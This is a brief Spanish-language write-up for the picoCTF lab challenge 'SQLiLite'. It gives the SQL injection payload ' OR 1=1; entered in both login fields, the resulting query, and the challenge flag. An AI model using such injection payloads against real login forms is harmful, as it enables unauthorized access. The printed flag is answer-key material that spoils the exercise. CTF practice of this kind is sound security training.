## Reto: SQLiLite
### Descripción
Can you login to this website?Try to login [here](http://saturn.picoctf.net:49842/)
### Solución
Entramos a la pagina a la cual nos dirige el enlace, ahí la manera mas rápida y fácil de `loggearse` es usando el comando `OR 1=1;` para que lo tome como verdadero, así que lo ponemos en ambas partes, para que no exista problema y nos aparece lo siguiente:
```http
username: ' OR 1=1;
password: ' OR 1=1;
SQL query: SELECT * FROM users WHERE name='' OR 1=1;' AND password='' OR 1=1;'

# Logged in! But can you see the flag,
```
Nos pregunta si podemos ver la bandera, y al inspeccionar el codigo fuente la encontramos facilmente:
```flag
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
```

### Notas adicionales
### Referencias

